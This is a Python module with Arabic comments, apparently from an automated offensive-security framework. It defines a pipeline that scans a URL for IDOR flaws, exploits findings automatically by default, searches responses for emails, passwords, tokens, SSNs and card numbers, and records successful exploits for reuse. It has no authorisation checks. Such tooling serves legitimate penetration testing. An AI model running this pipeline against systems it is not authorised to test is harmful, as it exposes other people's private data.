
import asyncio
import re
from typing import Dict, List, Optional, Any, Set
from dataclasses import dataclass, field
from datetime import datetime
from urllib.parse import urlparse, parse_qs

from ..scanners.idor_scanner import IDORScanner, Finding
from ..scanners.base_scanner import ScanContext, ScanTarget, Severity, Confidence
from ..exploitation.exploit_orchestrator import ExploitTarget, get_exploit_orchestrator
from ..exploitation.exploit_memory import get_exploit_memory

import logging

logger = logging.getLogger(__name__)


@dataclass
class IDORPipelineResult:
    """نتائج خط أنابيب IDOR"""
    target_url: str
    start_time: datetime
    end_time: Optional[datetime] = None
    findings: List[Finding] = field(default_factory=list)
    exploited: List[Dict] = field(default_factory=list)
    accessed_resources: List[Dict] = field(default_factory=list)
    total_requests: int = 0
    total_findings: int = 0
    exploited_count: int = 0
    sensitive_data_accessed: bool = False
    status: str = "pending"
    error: Optional[str] = None


class IDORPipeline:
    """
    خط أنابيب هجمات IDOR المتكامل
    
    الميزات:
    - فحص IDOR متقدم
    - اكتشاف المعرفات القابلة للتخمين
    - اختبار الوصول الأفقي والعمودي
    - استغلال تلقائي للثغرات
    - تكامل مع ذاكرة الاستغلال
    - كشف البيانات الحساسة
    """
    
    def __init__(self):
        self._scanner = IDORScanner()
        self._orchestrator = get_exploit_orchestrator()
        self._memory = get_exploit_memory()
        
        self._active_pipelines: Dict[str, IDORPipelineResult] = {}
        
        logger.info("IDORPipeline initialized")
    
    async def run(
        self,
        target_url: str,
        params: Dict[str, str] = None,
        headers: Dict[str, str] = None,
        cookies: Dict[str, str] = None,
        max_ids_to_test: int = 20,
        auto_exploit: bool = True,
        detect_sensitive_data: bool = True
    ) -> IDORPipelineResult:
        """
        تنفيذ خط أنابيب IDOR كامل
        
        Args:
            target_url: الرابط المستهدف
            params: معاملات إضافية
            headers: هيدرات مخصصة
            cookies: كوكيز للمصادقة
            max_ids_to_test: الحد الأقصى للمعرفات للاختبار
            auto_exploit: استغلال تلقائي للثغرات
            detect_sensitive_data: كشف البيانات الحساسة
        
        Returns:
            نتائج خط الأنابيب
        """
        pipeline_id = f"idor_{target_url}_{int(datetime.now().timestamp())}"
        
        result = IDORPipelineResult(
            target_url=target_url,
            start_time=datetime.now()
        )
        
        self._active_pipelines[pipeline_id] = result
        
        logger.info(f"Starting IDOR pipeline for {target_url}")
        
        try:
            # 1. تحضير السياق
            context = ScanContext(
                target=ScanTarget(
                    url=target_url,
                    headers=headers or {},
                    params=params or {},
                    cookies=cookies or {}
                )
            )
            
            # 2. البحث عن استغلالات سابقة مشابهة
            similar_exploits = self._memory.find_similar_exploits(
                vulnerability_type="IDOR",
                min_success_rate=0.5,
                limit=10
            )
            
            if similar_exploits:
                logger.info(f"Found {len(similar_exploits)} similar exploits in memory")
            
            # 3. تحليل URL لاستخراج المعرفات
            ids_in_url = self._extract_ids_from_url(target_url)
            
            # 4. تنفيذ الفحص
            findings = await self._scanner.scan(context)
            result.findings = findings
            result.total_findings = len(findings)
            
            # 5. استغلال تلقائي
            if auto_exploit and findings:
                for finding in findings[:5]:  # حد أقصى 5 ثغرات
                    exploit_result = await self._exploit_vulnerability(target_url, finding)
                    if exploit_result:
                        result.exploited.append(exploit_result)
                        result.exploited_count += 1
                        
                        # كشف البيانات الحساسة
                        if detect_sensitive_data and exploit_result.get("response"):
                            sensitive = self._detect_sensitive_data(exploit_result["response"])
                            if sensitive:
                                result.sensitive_data_accessed = True
                                exploit_result["sensitive_data"] = sensitive
                        
                        # تسجيل الموارد التي تم الوصول إليها
                        result.accessed_resources.append({
                            "url": exploit_result.get("url", ""),
                            "original_id": exploit_result.get("original_id"),
                            "modified_id": exploit_result.get("modified_id"),
                            "parameter": exploit_result.get("parameter")
                        })
            
            result.total_requests = self._scanner._total_requests
            result.status = "completed"
            
        except Exception as e:
            logger.error(f"IDOR pipeline failed: {e}")
            result.status = "failed"
            result.error = str(e)
        
        finally:
            result.end_time = datetime.now()
            await self._scanner.close()
        
        logger.info(f"IDOR pipeline completed: {len(result.findings)} findings, {result.exploited_count} exploited")
        
        return result
    
    def _extract_ids_from_url(self, url: str) -> List[str]:
        """استخراج المعرفات من URL"""
        ids = []
        
        # أرقام
        numbers = re.findall(r'\b\d{3,}\b', url)
        ids.extend(numbers)
        
        # UUIDs
        uuids = re.findall(r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b', url, re.I)
        ids.extend(uuids)
        
        return ids
    
    async def _exploit_vulnerability(
        self,
        target_url: str,
        finding: Finding
    ) -> Optional[Dict]:
        """
        استغلال ثغرة IDOR
        
        Args:
            target_url: الرابط المستهدف
            finding: نتيجة الفحص
        
        Returns:
            نتيجة الاستغلال
        """
        # استخراج المعرف الأصلي والمعدل من الأدلة
        evidence = finding.evidence or ""
        
        original_id = None
        modified_id = None
        
        # محاولة استخراج المعرفات من الأدلة
        id_pattern = r'ID modified from (\d+) to (\d+)'
        match = re.search(id_pattern, evidence)
        if match:
            original_id = match.group(1)
            modified_id = match.group(2)
        
        # إنشاء هدف الاستغلال
        exploit_target = ExploitTarget(
            url=finding.url,
            vulnerability_type="IDOR",
            parameter=finding.parameter,
            method="GET"
        )
        
        # تنفيذ الاستغلال
        result = await self._orchestrator._exploit_target(exploit_target, None)
        
        if result and result.status.value == "success":
            exploit_result = {
                "url": finding.url,
                "parameter": finding.parameter,
                "original_id": original_id,
                "modified_id": modified_id,
                "payload": finding.payload,
                "response": result.output[:1000] if result.output else "",
                "status_code": result.metadata.get("status_code", 200) if result.metadata else 200,
                "execution_time": result.execution_time
            }
            
            # تخزين الاستغلال الناجح في الذاكرة
            self._memory.store_exploit(
                name=f"IDOR_{target_url}_{finding.parameter}",
                target_type="web_api",
                vulnerability_type="IDOR",
                payload=finding.payload or "",
                encoding="none",
                success=True,
                context=finding.parameter,
                metadata={
                    "url": target_url,
                    "original_id": original_id,
                    "modified_id": modified_id,
                    "confidence": finding.confidence.value,
                    "parameter": finding.parameter
                }
            )
            
            return exploit_result
        
        return None
    
    def _detect_sensitive_data(self, response: str) -> List[str]:
        """
        كشف البيانات الحساسة في الاستجابة
        
        Args:
            response: نص الاستجابة
        
        Returns:
            قائمة بالبيانات الحساسة المكتشفة
        """
        sensitive = []
        
        patterns = [
            (r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', "Email"),
            (r'"password"\s*:\s*"[^"]+"', "Password field"),
            (r'"token"\s*:\s*"[a-zA-Z0-9_\-\.]+"', "Token"),
            (r'\b\d{3}-\d{2}-\d{4}\b', "SSN"),
            (r'\b\d{16}\b', "Credit Card"),
            (r'"ssn"\s*:\s*"[^"]+"', "SSN field"),
            (r'"credit[_]?card"\s*:\s*"[^"]+"', "Credit card field"),
            (r'"phone"\s*:\s*"[^"]+"', "Phone number"),
            (r'"address"\s*:\s*"[^"]+"', "Address"),
            (r'"role"\s*:\s*"admin"', "Admin role detected"),
            (r'"is_admin"\s*:\s*true', "Admin flag detected"),
        ]
        
        for pattern, name in patterns:
            if re.search(pattern, response, re.I):
                sensitive.append(name)
        
        return list(set(sensitive))  # إزالة التكرارات
    
    async def get_result(self, pipeline_id: str) -> Optional[IDORPipelineResult]:
        """الحصول على نتيجة خط الأنابيب"""
        return self._active_pipelines.get(pipeline_id)
    
    async def get_summary(self) -> Dict:
        """ملخص خطوط الأنابيب النشطة"""
        return {
            "active_pipelines": len(self._active_pipelines),
            "completed": sum(1 for r in self._active_pipelines.values() if r.status == "completed"),
            "failed": sum(1 for r in self._active_pipelines.values() if r.status == "failed"),
            "total_findings": sum(r.total_findings for r in self._active_pipelines.values()),
            "total_exploited": sum(r.exploited_count for r in self._active_pipelines.values()),
            "sensitive_data_accessed": sum(1 for r in self._active_pipelines.values() if r.sensitive_data_accessed),
            "total_resources_accessed": sum(len(r.accessed_resources) for r in self._active_pipelines.values())
        }
    
    async def close(self):
        """إغلاق الخط الأنابيب"""
        await self._scanner.close()
        logger.info("IDORPipeline closed")


# نسخة عالمية
async def get_idor_pipeline() -> IDORPipeline:
    """الحصول على نسخة من خط أنابيب IDOR"""
    return IDORPipeline()

